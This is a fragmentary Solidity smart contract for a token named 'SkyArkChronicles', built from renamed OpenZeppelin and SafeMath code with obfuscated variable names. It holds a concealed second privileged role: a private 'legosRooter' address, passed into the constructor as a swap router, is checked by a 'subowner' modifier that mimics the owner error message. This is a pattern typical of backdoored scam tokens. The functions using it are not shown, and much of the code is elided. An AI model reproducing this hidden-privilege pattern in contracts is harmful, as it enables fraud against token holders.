...
/*
SkyArkChronicles 
https://SkyArkChronicles.io/
https://docs.SkyArkChronicles.io/
https://t.me/SkyArkChronicles
*/
pragma solidity 0.8.24;

interface SkyArkChronicles33 {
  /**
...
/*
 * @dev Provides information about the current execution SkyArkChronicles20Burnable, including the
 ...
 */
abstract contract SkyArkChronicles20Burnable {
...
// File: @openzeppelin/contracts/access/SkyArkChronicles20Ownable.sol
 ...
 * the owner.
 */
abstract contract SkyArkChronicles20Ownable is SkyArkChronicles20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "SkyArkChronicles20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "SkyArkChronicles20Ownable: new owner is the zero address");
 ...
 * `SafeSkyArkChronicles` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeSkyArkChronicles {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeSkyArkChronicles: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeSkyArkChronicles: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeSkyArkChronicles: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeSkyArkChronicles: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeSkyArkChronicles: modulo by zero");
  }
...
contract SkyArkChroniclesToken is SkyArkChronicles20Burnable, SkyArkChronicles33, SkyArkChronicles20Ownable {
    
    using SafeSkyArkChronicles for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "SkyArkChronicles";
        _symbol = "SkyArkChronicles";
        _decimals = 9;
    ...
    string public SkyArkChroniclestelegramcchannel = "https://t.me/SkyArkChronicles";
            function getSkyArkChroniclestelegramcchannel() public view returns (string memory) {
        return SkyArkChroniclestelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {SkyArkChronicles33-totalSupply}.
    */
    ...
    /**
    * @dev See {SkyArkChronicles33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "SkyArkChronicles20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {SkyArkChronicles33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {SkyArkChronicles33-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {SkyArkChronicles33-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {SkyArkChronicles33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {SkyArkChronicles33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "SkyArkChronicles33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {SkyArkChronicles33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "SkyArkChronicles33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "SkyArkChronicles33: transfer from the zero address");
        require(shippingto != address(0), "SkyArkChronicles33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "SkyArkChronicles33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "SkyArkChronicles33: approve from the zero address");
        require(transporteur != address(0), "SkyArkChronicles33: approve to the zero address");
